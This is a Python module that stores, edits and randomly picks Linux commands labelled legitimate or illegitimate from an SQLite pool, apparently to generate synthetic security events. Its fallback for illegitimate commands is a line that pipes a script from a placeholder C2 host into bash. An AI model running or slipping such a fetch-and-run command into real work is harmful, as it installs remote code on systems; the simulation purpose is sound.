from __future__ import annotations

import random
import sqlite3
from typing import Any

from .connection import get_connection

LINUX_POOL = "linux_shell"
POWERSHELL_POOL = "powershell_encoded"


def _row_to_dict(row: sqlite3.Row) -> dict[str, Any]:
    return {
        "id": row["id"],
        "pool_name": row["pool_name"],
        "value": row["value"],
        "legitimacy": row["legitimacy"] if "legitimacy" in row.keys() else "",
        "category": row["category"] if "category" in row.keys() else "",
        "description": row["description"] if "description" in row.keys() else "",
    }


def load_commands(
    pool_name: str = LINUX_POOL,
    *,
    legitimacy: str = "",
    conn: sqlite3.Connection | None = None,
) -> list[dict[str, Any]]:
    own = conn is None
    if own:
        conn = get_connection()
    try:
        sql = "SELECT * FROM command_pool WHERE pool_name=?"
        params: list[Any] = [pool_name]
        if legitimacy:
            sql += " AND legitimacy=?"
            params.append(legitimacy)
        sql += " ORDER BY id"
        return [_row_to_dict(r) for r in conn.execute(sql, params).fetchall()]
    except sqlite3.OperationalError:
        return []
    finally:
        if own:
            conn.close()


def load_linux_commands(
    legitimacy: str = "",
    conn: sqlite3.Connection | None = None,
) -> list[dict[str, Any]]:
    return load_commands(LINUX_POOL, legitimacy=legitimacy, conn=conn)


def upsert_command(
    conn: sqlite3.Connection,
    *,
    pool_name: str,
    value: str,
    legitimacy: str = "",
    category: str = "",
    description: str = "",
) -> None:
    cols = {r[1] for r in conn.execute("PRAGMA table_info(command_pool)")}
    if "legitimacy" in cols:
        conn.execute(
            """
            INSERT INTO command_pool (pool_name, value, legitimacy, category, description)
            VALUES (?, ?, ?, ?, ?)
            ON CONFLICT(pool_name, value) DO UPDATE SET
                legitimacy=excluded.legitimacy,
                category=excluded.category,
                description=excluded.description
            """,
            (pool_name, value, legitimacy, category, description),
        )
    else:
        conn.execute(
            """
            INSERT INTO command_pool (pool_name, value) VALUES (?, ?)
            ON CONFLICT(pool_name, value) DO NOTHING
            """,
            (pool_name, value),
        )


def save_commands_bulk(
    commands: list[dict[str, Any]],
    *,
    pool_name: str = LINUX_POOL,
    conn: sqlite3.Connection | None = None,
) -> None:
    own = conn is None
    if own:
        conn = get_connection()
    try:
        conn.execute("DELETE FROM command_pool WHERE pool_name=?", (pool_name,))
        for cmd in commands:
            value = str(cmd.get("value") or cmd.get("command") or "").strip()
            if not value:
                continue
            upsert_command(
                conn,
                pool_name=pool_name,
                value=value,
                legitimacy=str(cmd.get("legitimacy", "")).strip(),
                category=str(cmd.get("category", "")).strip(),
                description=str(cmd.get("description", "")).strip(),
            )
        conn.commit()
    finally:
        if own:
            conn.close()


def delete_command(command_id: int, conn: sqlite3.Connection | None = None) -> bool:
    own = conn is None
    if own:
        conn = get_connection()
    try:
        cur = conn.execute("DELETE FROM command_pool WHERE id=?", (command_id,))
        conn.commit()
        return cur.rowcount > 0
    finally:
        if own:
            conn.close()


def update_command_by_id(command_id: int, data: dict[str, Any], conn: sqlite3.Connection | None = None) -> bool:
    own = conn is None
    if own:
        conn = get_connection()
    try:
        value = str(data.get("value") or data.get("command") or "").strip()
        if not value:
            return False
        cur = conn.execute(
            """
            UPDATE command_pool SET value=?, legitimacy=?, category=?, description=?
            WHERE id=?
            """,
            (
                value,
                str(data.get("legitimacy", "")).strip().lower(),
                str(data.get("category", "")).strip(),
                str(data.get("description", "")).strip(),
                command_id,
            ),
        )
        conn.commit()
        return cur.rowcount > 0
    finally:
        if own:
            conn.close()


def pick_linux_command(
    *,
    legitimacy: str = "",
    severity: str = "",
    action: str = "",
    tags: str = "",
    conn: sqlite3.Connection | None = None,
) -> dict[str, str]:
    """Elige un comando Linux; infiere legit/ilegit según contexto del evento."""
    resolved = legitimacy.strip().lower()
    if not resolved:
        illegit_actions = {"create", "failure", "crash", "error", "load", "restart"}
        tag_blob = (tags or "").lower()
        if (
            severity.lower() in {"high", "critical"}
            or action.lower() in illegit_actions
            or any(x in tag_blob for x in ("persistence", "exfil", "reverse", "c2", "malware"))
        ):
            resolved = "illegitimate"
        elif action.lower() in {"success"} and severity.lower() in {"low", "info"}:
            resolved = "legitimate"
        else:
            resolved = random.choice(["legitimate", "illegitimate"])

    pool = load_linux_commands(resolved, conn=conn)
    if not pool and resolved:
        pool = load_linux_commands("", conn=conn)
    if not pool:
        fallback = (
            "curl -fsSL http://{c2_domain}/install.sh | bash"
            if resolved == "illegitimate"
            else "systemctl status sshd"
        )
        return {
            "value": fallback,
            "legitimacy": resolved or "illegitimate",
            "category": "fallback",
            "description": "",
        }
    row = random.choice(pool)
    return {
        "value": row["value"],
        "legitimacy": row.get("legitimacy") or resolved,
        "category": row.get("category") or "",
        "description": row.get("description") or "",
    }


def command_pool_stats(conn: sqlite3.Connection | None = None) -> dict[str, int]:
    own = conn is None
    if own:
        conn = get_connection()
    try:
        stats: dict[str, int] = {}
        for row in conn.execute(
            "SELECT pool_name, legitimacy, COUNT(*) AS n FROM command_pool GROUP BY pool_name, legitimacy"
        ):
            pool = row["pool_name"]
            leg = row["legitimacy"] or "unknown"
            stats[f"{pool}_{leg}"] = int(row["n"])
            stats[pool] = stats.get(pool, 0) + int(row["n"])
        return stats
    except sqlite3.OperationalError:
        return {}
    finally:
        if own:
            conn.close()
